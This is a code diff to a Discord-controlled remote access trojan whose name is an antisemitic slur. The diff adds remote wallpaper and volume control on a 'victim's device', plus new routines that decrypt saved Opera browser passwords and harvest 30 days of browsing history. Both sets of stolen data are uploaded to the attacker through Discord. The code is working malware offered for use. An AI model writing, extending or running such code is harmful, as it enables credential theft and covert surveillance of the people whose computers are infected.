@@ -1,6 +1,8 @@
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from Cryptodome.Cipher import AES
 from discord.ext import commands
 from PIL import Image, ImageDraw
+from comtypes import CLSCTX_ALL
 from threading import Thread
 from pynput import keyboard
 import subprocess
@@ -37,7 +39,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.3.1" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.3.2" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -147,6 +149,106 @@ def check_permissions(file_path):
         'delete': os.access(file_path, os.W_OK)
     }
     return permissions
+
+@bot.command(help="Gets or sets the desktop wallpaper. Usage: $wallpaper get | $wallpaper set [optional: image path or upload image]")
+async def wallpaper(ctx, action: str = None, filepath: str = None):
+    try:
+        if action is None or action.lower() not in ["get", "set"]:
+            await ctx.send("Usage: `$wallpaper get` or `$wallpaper set [image path]` (or upload image)")
+            return
+
+        if action.lower() == "get":
+            buf = ctypes.create_unicode_buffer(260)
+            ctypes.windll.user32.SystemParametersInfoW(0x0073, len(buf), buf, 0)
+            wallpaper_path = buf.value
+
+            if os.path.exists(wallpaper_path):
+                await ctx.send(
+                    f"Current wallpaper is located at `{wallpaper_path}`",
+                    file=discord.File(wallpaper_path, filename=os.path.basename(wallpaper_path))
+                )
+            else:
+                await ctx.send(f"Wallpaper path: `{wallpaper_path}` (File not found)")
+            return
+
+        if action.lower() == "set":
+            valid_exts = ('.png', '.jpg', '.jpeg', '.bmp')
+
+            if filepath:
+                if not os.path.exists(filepath):
+                    await ctx.send(f"File not found: `{filepath}`")
+                    return
+                if not filepath.lower().endswith(valid_exts):
+                    await ctx.send("Invalid file type from path. Must be .png, .jpg/jpeg, or .bmp.")
+                    return
+                ctypes.windll.user32.SystemParametersInfoW(20, 0, filepath, 3)
+                await ctx.send(f"Wallpaper set from path: `{filepath}`")
+                return
+
+            if not ctx.message.attachments:
+                await ctx.send("Please upload a `.png`, `.jpg/jpeg`, or `.bmp` image, or provide a valid path.")
+                return
+
+            attachment = ctx.message.attachments[0]
+            if not any(attachment.filename.lower().endswith(ext) for ext in valid_exts):
+                await ctx.send("Invalid file type. Only .png, .jpg/jpeg, or .bmp files are allowed.")
+                return
+
+            c = wmi.WMI()
+            system_uuid = c.Win32_ComputerSystemProduct()[0].UUID
+            ext = os.path.splitext(attachment.filename)[-1]
+            temp_path = os.path.join(os.getenv("TEMP"), f"wallpaper_{system_uuid}{ext}")
+            await attachment.save(temp_path)
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_path, 3)
+            await ctx.send("Wallpaper set successfully from uploaded image.")
+    except Exception as e:
+        await ctx.send(f"Error processing wallpaper command: {str(e)}")
+
+@bot.command(help="Controls system volume. Usage: $vol [up/down/set/mute/unmute/query] [value]")
+async def vol(ctx, action: str = "query", value: int = None):
+    try:
+        devices = AudioUtilities.GetSpeakers()
+        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+        volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
+
+        if action == "up":
+            step = value if value is not None else 2
+            current = volume.GetMasterVolumeLevelScalar()
+            volume.SetMasterVolumeLevelScalar(min(current + step / 100, 1.0), None)
+            await ctx.send(f"Volume increased to {int(volume.GetMasterVolumeLevelScalar() * 100)}%")
+
+        elif action == "down":
+            step = value if value is not None else 2
+            current = volume.GetMasterVolumeLevelScalar()
+            volume.SetMasterVolumeLevelScalar(max(current - step / 100, 0.0), None)
+            await ctx.send(f"Volume decreased to {int(volume.GetMasterVolumeLevelScalar() * 100)}%")
+
+        elif action == "set":
+            if value is None or not (0 <= value <= 100):
+                await ctx.send("Please provide a valid volume percentage (0-100).")
+                return
+            volume.SetMasterVolumeLevelScalar(value / 100, None)
+            await ctx.send(f"Volume set to {value}%")
+
+        elif action == "mute":
+            volume.SetMute(1, None)
+            await ctx.send("System muted.")
+
+        elif action == "unmute":
+            volume.SetMute(0, None)
+            await ctx.send("System unmuted.")
+
+        elif action == "query":
+            current_volume = int(volume.GetMasterVolumeLevelScalar() * 100)
+            mute = volume.GetMute()
+            status = "Muted" if mute else "Unmuted"
+            await ctx.send(f"Volume: {current_volume}% ({status})")
+
+        else:
+            await ctx.send("Invalid action. Use up, down, set, mute, unmute, or query.")
+
+    except Exception as e:
+        await ctx.send(f"Error adjusting volume: {str(e)}")
 
 # -------------------
 #       PYMACRO
@@ -863,6 +965,31 @@ async def getpasswords(ctx, max_force_profiles: int = 10):
             missing_browsers.append("Opera GX")
     else:
         missing_browsers.append("Opera GX")
+        
+    # Plain Opera
+    opera_plain_path = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable")
+    opera_plain_local_state = os.path.join(opera_plain_path, "Local State")
+    opera_plain_login_data = os.path.join(opera_plain_path, "Login Data")
+
+    if os.path.exists(opera_plain_local_state) and os.path.exists(opera_plain_login_data):
+        try:
+            opera_plain_key = get_master_key(opera_plain_local_state)
+            entries = dump_passwords(opera_plain_login_data, opera_plain_key)
+
+            if entries:
+                opera_output = io.StringIO()
+                opera_output.write("===== Opera =====\n\n")
+                for url, username, pw in entries:
+                    opera_output.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypt_password(pw, opera_plain_key)}\n{'-'*40}\n")
+                opera_buffer = io.BytesIO(opera_output.getvalue().encode('utf-8'))
+                files.append(discord.File(fp=opera_buffer, filename="Opera_passwords.txt"))
+            else:
+                missing_browsers.append("Opera")
+
+        except Exception:
+            missing_browsers.append("Opera")
+    else:
+        missing_browsers.append("Opera")
 
     content = ""
     if missing_browsers and len(missing_browsers) < 2:
@@ -932,7 +1059,7 @@ async def gethistory(ctx, max_force_profiles: int = 10):
             i += 1
         return output.getvalue().encode("utf-8") if found else None, None
 
-    async def extract_opera_history():
+    async def extract_operagx_history():
         base = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable")
         history_path = os.path.join(base, "History")
         if not os.path.exists(history_path):
@@ -964,9 +1091,43 @@ async def gethistory(ctx, max_force_profiles: int = 10):
         if os.path.exists(temp_db):
             os.remove(temp_db)
         return output.getvalue().encode("utf-8"), None
+    
+    async def extract_opera_history():
+        base = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Default")
+        history_path = os.path.join(base, "History")
+        if not os.path.exists(history_path):
+            return None, "Opera"
+        try:
+            output = io.StringIO()
+            epoch_start = datetime.datetime(1601, 1, 1)
+            min_date = datetime.datetime.utcnow() - datetime.timedelta(days=30)
+            min_timestamp = int((min_date - epoch_start).total_seconds() * 1_000_000)
+
+            temp_db = os.path.join(os.getenv("TEMP"), "opera_plain_history_temp.db")
+            shutil.copy2(history_path, temp_db)
+
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            cursor.execute("SELECT url, last_visit_time FROM urls WHERE last_visit_time > ?", (min_timestamp,))
+            rows = cursor.fetchall()
+            if rows:
+                output.write("===== Opera =====\n\n")
+                for url, ts in rows:
+                    visit_time = epoch_start + datetime.timedelta(microseconds=ts)
+                    output.write(f"URL: {url}\n")
+                    output.write(f"Visited: {visit_time.strftime('%Y-%m-%d %H:%M:%S')} (UTC)\n")
+                    output.write("----------------------------------------\n")
+                output.write("\n")
+            conn.close()
+        except Exception as e:
+            await ctx.send("Error extracting Opera history: " + str(e))
+        if os.path.exists(temp_db):
+            os.remove(temp_db)
+        return output.getvalue().encode("utf-8"), None
 
     chrome_data, chrome_err = await extract_chrome_history()
-    opera_data, opera_err = await extract_opera_history()
+    opera_data, opera_err = await extract_operagx_history()
+    opera_plain_data, opera_plain_err = await extract_opera_history()
 
     if chrome_data:
         chrome_buffer = io.BytesIO(chrome_data)
@@ -980,19 +1141,26 @@ async def gethistory(ctx, max_force_profiles: int = 10):
     elif opera_err:
         missing_browsers.append(opera_err)
 
+    if opera_plain_data:
+        opera_plain_buffer = io.BytesIO(opera_plain_data)
+        files.append(discord.File(fp=opera_plain_buffer, filename="Opera_history.txt"))
+    elif opera_plain_err:
+        missing_browsers.append(opera_plain_err)
+
     content = ""
-    if missing_browsers and len(missing_browsers) < 2:
+    if missing_browsers and len(missing_browsers) == 1:
         content = f"Files not found for: {missing_browsers[0]}"
     elif missing_browsers:
         content = "Files not found for: " + ", ".join(missing_browsers)
 
     if not files and not content:
-        content = "No history files were found for either browser."
+        content = "No history files were found for any browser."
 
     try:
         await ctx.send(content=content, files=files if files else None)
     except Exception as e:
         await ctx.send(f"Error sending message: {e}")
+
 
 @bot.command(help="Move cursor to defined x and y pixel coordinates on victim's device. based on only the primariy display, If you dont like it, you can suck it.")
 async def setpos(ctx, x: int, y: int):
